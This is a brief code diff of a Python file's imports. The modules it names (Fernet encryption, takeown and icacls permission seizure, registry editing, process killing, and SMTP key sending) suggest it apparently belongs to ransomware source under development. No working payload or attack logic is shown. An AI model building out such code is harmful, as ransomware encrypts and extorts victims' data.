@@ -3,9 +3,9 @@
 from cryptography.fernet import Fernet
 from modules.crypt import crypt
 from modules.permission import takeown, icacls, get_admin_rights
-from modules.system import killproc, regedit, set_wallpaper
+from modules.system import delproc, regedit
 from modules.network import host_connect, sendkey_smtp
-import os, sys, socket, wget, struct, ctypes, shutil, winreg, time, ctypes
+import os, sys, socket, wget, struct, ctypes, shutil, winreg, time
 
 def getcrypt():
     gt.proc()
